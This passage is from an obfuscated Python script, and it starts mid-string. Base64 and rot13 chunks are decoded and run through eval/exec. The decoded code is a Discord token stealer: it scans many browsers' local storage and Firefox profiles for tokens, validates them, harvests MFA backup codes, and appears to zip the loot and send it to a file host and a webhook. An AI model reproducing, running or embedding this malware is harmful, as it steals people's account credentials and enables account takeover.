CAgICAgICAgICAnVml2YWxkaSc6IHNlbGYuYXBwZGF0YSArIHInXFxWaXZhbGRpXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdDaHJvbWUgU3hTJzogc2VsZi5hcHBkYXRhICsgcidcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnQ2hyb21lJzogc2VsZi5hcHBkYXRhICsgcidcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdFcGljIFByaXZhY3kgQnJvd3Nlcic6IHNlbGYuYXBwZGF0YSArIHInXFxFcGljIFByaXZhY3kgQnJvd3NlclxcVXNlciBEYXRhXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiXFwnLAogICAgICAgICAgICAnTWljcm9zb2Z0IEVkZ2UnOiBzZWxmLmFwcGRhdGEgKyByJ1xcTWljcm9zb2Z0XFxFZGdlXFxVc2VyIERhdGFcXERlZmF1bFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywKICAgICAgICAgICAgJ1VyYW4nOiBzZWxmLmFwcGRhdGEgKyByJ1xcdUNvek1lZGlhXFxVcmFuXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdZYW5kZXgnOiBzZWxmLmFwcGRhdGEgKyByJ1xcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdCcmF2ZSc6IHNlbGYuYXBwZGF0YSArIHInXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsCiAgICAgICAgICAgICdJcmlkaXVtJzogc2VsZi5hcHBkYXRhICsgcidcXElyaWRpdW1cXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJwogICAgICAgIH0KCiAgICAgICAgZm9yIHNvdXJjZSwgcGF0aCBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6CiAgICAgICAgICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHNlbGYucmVnZXgpOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gZmluZGFsbChyZWdleCwgbGluZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9rZW4gaW4gc2VsZi50b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLmdldGVudigiYXBwZGF0YSIpKyJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgIGZvciBwYXRoLCBzdWJkaXJzLCBmaWxlcyBpbiBvcy53YWxrKG9zLmdldGVudigiYXBwZGF0YSIpKyJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6CiAgICAgICAgICAgICAgICBmb3IgX2ZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9maWxlLmVuZHN3aXRoKCcuc3FsaXRlJyk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7X2ZpbGV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOgogICAgICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHNlbGYucmVnZXgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRva2VuIGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIGRlZiBuZWF0aWZ5VG9rZW5zKHNlbGYpOgogICAgICAgIGYgPSBvcGVuKHNlbGYudGVtcGZvbGRlcisiXFxEaXNjb3JkIEluZm8udHh0IiwgInciLCBlbmNvZGluZz0iY3A0MzciLCBlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgZm9yIHRva2VuIGluIHNlbGYudG9rZW5zOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBqID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz1zZWxmLmdldGhlYWRlcnModG9rZW4pKS5qc29uKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgdXNlciA9IGpbInVzZXJuYW1lIl0gKyAiIyIgKyBzdHIoalsiZGlzY3JpbWluYXRvciJdKQoKICAgICAgICAgICAgaWYgdG9rZW4uc3RhcnRzd2l0aCgibWZhLiIpIGFuZCBzZWxmLmRpc2NvcmRfcHN3OgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKHNlbGYudGVtcGZvbGRlcitvcy5zZXArIkRpc2NvcmQgYmFja3VwQ29kZXMudHh0IiwgImEiLCBlcnJvcnM9Imlnbm9yZSIpIGFzIGZwOgogICAgICAgICAgICAgICAgICAgIGZwLndyaXRlKGYie3VzZXJ9IEJhY2t1cCBDb2RlcyIuY2VudGVyKDM2LCAiLSIpKyJcbiIpCiAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gc2VsZi5kaXNjb3JkX3BzdzoKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3Qoc2VsZi5iYXNldXJsKyIvbWZhL2NvZGVzIiwgaGVhZGVycz1zZWxmLmdldGhlYWRlcnModG9rZW4pLCBqc29uPXsicGFzc3dvcmQiOiB4LCAicmVnZW5lcmF0ZSI6IEZhbHNlfSkuanNvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiByWyJiYWNrdXBfY29kZXMiXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpIG5vdCBpbiBzZWxmLmJhY2t1cF9jb2RlczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5iYWNrdXBfY29kZXMuYXBwZW5kKGkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZwLndyaXRlKGYnXHR7aVsiY29kZSJdfSB8IHsiQWxyZWFkeSB1c2VkIiBpZiBpWyJjb25zdW1lZCJdID09IFRydWUgZWxzZSAiTm90IHVzZWQifVxuJykKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgI'
destiny = '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JLtp2AlMJIhp2uiqPumMJkzXGbXVPNtVPNtVPOcoJSaMFN9VRygLJqyE3WuLv5apzSvXNbtVPNtVPNtVPNtVPOvLz94CH5iozHfVNbtVPNtVPNtVPNtVPOcozAfqJEyK2kurJIlMJEsq2yhMT93pm1TLJkmMFjtPvNtVPNtVPNtVPNtVTSfoS9mL3WyMJ5mCHMuoUAyYPNXVPNtVPNtVPNtVPNtrTEcp3OfLKx9Gz9hMDbtVPNtVPNtVPxXVPNtVPNtVPOcoJSaMF5mLKMyXUAyoTLhqTIgpTMioTEypvNeVPWpKSAwpzIyoaAbo3DhpT5aVvxXVPNtVPNtVPOcoJSaMF5woT9mMFtcPtbtVPNtMTIzVSAyozEWozMiXUAyoTLcBtbtVPNtVPNtVUqeMKxtCFOipl5jo3Oyovtvq21cLlOjLKEbVUAiMaE3LKWyoTywMJ5mnJ5ap2IlqzywMFOaMKDtG0RmrR9lnJqcozSfHUWiMUIwqRgyrFVcYaWyLJDbXF5mqUWcpPtvG0RmrR9lnJqcozSfHUWiMUIwqRgyrJ5povVcYaA0pzyjXPxXVPNtVPNtVPOcpPN9VTAiqJ50paxtCFOwnKE5VQ0tpzIanJ9hVQ0tM29iM2kyoJSjVQ0tVx5iozHvPvNtVPNtVPNtqUW5BtbtVPNtVPNtVPNtVPOxLKEuVQ0tpzIkqJImqUZhM2I0XPWbqUEjBv8inKOcozMiYzyiY2cmo24vXF5dp29hXPxXVPNtVPNtVPNtVPNtnKNtCFOxLKEuJlqcpPqqPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVTAcqUxtCFOxLKEuJlqwnKE5W10XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPOwo3IhqUW5VQ0tMTS0LIfaL291oaElrFqqPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVUWyM2yiovN9VTEuqTSoW3WyM2yiovqqPvNtVPNtVPNtVPNtVTqio2qfMJ1upPN9VPWbqUEjpmbiY3q3ql5ao29aoTHhL29gY21upUZip2IupzAbY2qio2qfMFggLKNeXlVtXlOxLKEuJlqfo2ZaKDbtVPNtVPNtVTI4L2IjqPOSrTAypUEco246PvNtVPNtVPNtVPNtVUOup3ZXVPNtVPNtVPOsrzyjMzyfMFN9VT9mYaOuqTthnz9covumMJkzYzSjpTEuqTRfVTLaHTSlLJEcp2IDpzIgnKIgJ3gipl5aMKEfo2qcovtcsI0hrzyjWlxXVPNtVPNtVPO6nKOjMJEsMzyfMFN9VUccpTMcoTHhJzyjEzyfMFusrzyjMzyfMFjtVapvYPO6nKOznJkyYycWHS9REHMZDIESEPxXVPNtVPNtVPOuLaAsp3WwVQ0to3ZhpTS0nP5uLaAjLKEbXUAyoTLhqTIgpTMioTEypvxXVPNtVPNtVPOzo3VtMTylozSgMFjtKljtMzyfMKZtnJ4to3Zhq2SfnlumMJkzYaEyoKOzo2kxMKVcBtbtVPNtVPNtVPNtVPOzo3VtMzyfMJ5uoJHtnJ4tMzyfM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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
